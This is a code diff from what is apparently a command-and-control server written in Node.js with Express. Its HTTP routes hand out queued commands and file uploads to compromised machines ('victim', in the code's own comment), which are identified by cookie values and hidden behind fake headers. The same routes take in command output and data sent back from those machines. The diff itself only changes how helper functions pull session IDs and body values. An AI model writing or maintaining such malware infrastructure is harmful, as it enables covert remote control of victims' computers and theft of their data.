@@ -285,7 +285,7 @@ async function http_listener() {
 			os = "windows"
 			os_path = "/assets/windows.png"
 		}
-		let id = funs.find_random_value(req.cookies)
+		let id = funs.find_random_value(req,req.cookies)
 		let session_exists = false
 		if(!list_cookies.includes(id)){
 			list_cookies.push(id);
@@ -319,7 +319,7 @@ async function http_listener() {
 		// send command to victim & save in history 
 
 		for(i=0;i<commands.length; i++){
-			if(funs.find_random_value(req.cookies) == commands[i].id){
+			if(funs.find_random_value(req,req.cookies) == commands[i].id){
 				// check if there is file uploaded
 				if(commands[i].upload){
 					res.send(`
@@ -356,7 +356,7 @@ async function http_listener() {
 	})
 	lis.get(/\/upload.*/,funs.fake_headers, (req, res) => {
 		for(i=0;i<commands.length; i++){
-			if(funs.find_random_value(req.cookies) == commands[i].id){
+			if(funs.find_random_value(req,req.cookies) == commands[i].id){
 				res.send(commands[i].upload)
 				commands[i].upload = undefined
 				
@@ -366,10 +366,10 @@ async function http_listener() {
 	
 	lis.post(/\/download.*/,funs.fake_headers, (req, res) => {
 		res.send("Hello")
-		if(funs.find_random_value(req.body) == "") return;
+		if(funs.find_random_value_body(req.body) == "") return;
 		for(i=0;i<commands.length;i++){
-			if(funs.find_random_value(req.cookies) == commands[i].id){
-				commands[i].response = funs.find_random_value(req.body)
+			if(funs.find_random_value(req,req.cookies) == commands[i].id){
+				commands[i].response = funs.find_random_value_body(req.body)
 				commands[i].download = true
 			}
 	
@@ -379,11 +379,11 @@ async function http_listener() {
 
 	lis.post(/\/response.*/,funs.fake_headers, (req, res) => {
 		res.send("Hello")
-		if(funs.find_random_value(req.body) == "") return;
+		if(funs.find_random_value_body(req.body) == "") return;
 		for(i=0;i<commands.length;i++){
-			if(funs.find_random_value(req.cookies) == commands[i].id){
-				commands[i].response = funs.find_random_value(req.body)
-				http_history.push({response:funs.find_random_value(req.body),id:commands[i].id})
+			if(funs.find_random_value(req,req.cookies) == commands[i].id){
+				commands[i].response = funs.find_random_value_body(req.body)
+				http_history.push({response:funs.find_random_value_body(req.body),id:commands[i].id})
 			}
 	
 		}
